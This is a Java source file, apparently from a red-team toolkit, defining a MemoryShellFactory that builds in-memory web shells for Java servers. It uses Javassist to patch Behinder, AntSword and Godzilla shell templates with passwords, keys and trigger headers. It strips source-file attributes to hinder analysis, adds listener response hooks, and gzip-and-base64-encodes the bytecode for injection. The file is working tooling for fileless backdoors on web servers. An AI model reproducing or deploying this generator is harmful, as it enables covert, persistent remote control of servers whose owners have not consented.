package com.potato.potatotool.content.redTeam.memshell.factory;

import com.potato.potatotool.utils.data.GzipUtils;
import com.potato.potatotool.utils.data.StrUtils;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.bytecode.ClassFile;
import com.potato.potatotool.content.redTeam.memshell.config.MemoryObj;
import com.potato.potatotool.content.redTeam.memshell.config.MemoryShellConstants;
import com.potato.potatotool.content.redTeam.memshell.util.ClassNameUtil;
import com.potato.potatotool.content.redTeam.memshell.util.JavassistUtil;
import com.potato.potatotool.content.redTeam.memshell.util.MemoryShellUtil;
import com.potato.potatotool.content.redTeam.memshell.util.RandomHeaderUtil;
import com.potato.potatotool.content.redTeam.memshell.util.ResponseCodeUtil;

import java.io.DataInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.nio.file.Files;

public class MemoryShellFactory {
    @SuppressWarnings("unchecked")
    ClassPool CLASS_POOL = ClassPool.getDefault();

    public byte[] generateShell(MemoryObj memoryObj) throws Exception {
        String toolType = memoryObj.getToolType();
        String shellType = memoryObj.getShellType();
        byte[] bytes;

        if(toolType.equals(MemoryShellConstants.TOOL_CUSTOM)){
            bytes = customShellBytes(memoryObj);
        }else {
            String shellClassName = MemoryShellUtil.getShellClassName(toolType, shellType);
            bytes = transformShellBytes(shellClassName, memoryObj);
        }
        if (bytes == null || bytes.length == 0) {
            throw new IllegalStateException("Shell bytes are empty");
        }
        byte[] compressedShellBytes = GzipUtils.GzipGetCompressedData(bytes);
        if (compressedShellBytes == null || compressedShellBytes.length == 0) {
            throw new IllegalStateException("Compressed shell bytes are empty");
        }

        // 设置内存对象的字节数组、字节长度以及gzip后的Base64字符串
        memoryObj.setShellBytes(bytes);
        memoryObj.setShellBytesLength(bytes.length);
        memoryObj.setShellGzipBase64String(StrUtils.base64Encode(compressedShellBytes));

        return bytes;
    }

    // 转换内存马字节码的方法
    private byte[] transformShellBytes(String className, MemoryObj memoryObj) throws Exception {
        String toolType = memoryObj.getToolType();
        String shellType = memoryObj.getShellType();
        CtClass ctClass = null;
        try {
            CLASS_POOL.insertClassPath(new ClassClassPath(this.getClass()));
            ctClass = CLASS_POOL.getCtClass(className);

            // 如果内存马类型不是 WFHANDLERMETHOD，则设置Java版本和头字段
            if (!shellType.equals(MemoryShellConstants.SHELLTYPE_WFHANDLERMETHOD)) {
                ctClass.getClassFile().setVersionToJava5();
                JavassistUtil.addOrUpdateFieldIfNotNull(ctClass, "headerName", RandomHeaderUtil.requireValidHeaderName(memoryObj.getHeaderName()));
                JavassistUtil.addOrUpdateFieldIfNotNull(ctClass, "headerValue", RandomHeaderUtil.requireValidHeaderValue(memoryObj.getHeaderValue()));
            }

            // 根据工具类型设置不同的字段
            switch (toolType) {
                case MemoryShellConstants.TOOL_BEHINDER:
                    JavassistUtil.addOrUpdateFieldIfNotNull(ctClass, "pass", StrUtils.md5(memoryObj.getPass()).substring(0, 16));
                    break;
                case MemoryShellConstants.TOOL_ANTSWORD:
                case MemoryShellConstants.TOOL_GODZILLA:
                    JavassistUtil.addOrUpdateFieldIfNotNull(ctClass, "pass", memoryObj.getPass());
                    if (toolType.equals(MemoryShellConstants.TOOL_GODZILLA)) {
                        JavassistUtil.addOrUpdateFieldIfNotNull(ctClass, "key", StrUtils.md5(memoryObj.getKey()).substring(0, 16));
                    }
                    break;
            }

            JavassistUtil.setClassNameIfNotNull(ctClass, memoryObj.getShellClassName());

            // 如果内存马类型是 LISTENER，则添加相应的获取HTTP响应的方法
            if (isListenerShellType(shellType)) {
                String methodBody = ResponseCodeUtil.getResponseCode(memoryObj.getServerType(), memoryObj.getShellType());
                JavassistUtil.addOrUpdateMethod(ctClass, "getResponseFromRequest", methodBody);
            }
            // 移除源文件属性，生成字节码并分离类
            JavassistUtil.removeSourceFileAttribute(ctClass);
            return ctClass.toBytecode();
        } finally {
            if (ctClass != null) {
                ctClass.detach();
            }
        }
    }

    private byte[] customShellBytes(MemoryObj memoryObj) throws Exception {
        if (memoryObj.getClassFilePath() == null || memoryObj.getClassFilePath().trim().isEmpty()) {
            throw new IllegalArgumentException("Class file path is empty");
        }
        File classFile = new File(memoryObj.getClassFilePath());
        if (!classFile.isFile()) {
            throw new IOException("Class file does not exist: " + memoryObj.getClassFilePath());
        }

        try (DataInputStream inputStream = new DataInputStream(new FileInputStream(classFile))) {
            ClassFile classFileInfo = new ClassFile(inputStream);
            memoryObj.setShellClassName(ClassNameUtil.requireValidJavaClassName(classFileInfo.getName(), "custom shell class name"));
        }

        return Files.readAllBytes(classFile.toPath());
    }

    private boolean isListenerShellType(String shellType) {
        return MemoryShellConstants.SHELLTYPE_LISTENER.equals(shellType)
                || MemoryShellConstants.SHELLTYPE_JAKARTA_LISTENER.equals(shellType);
    }

}
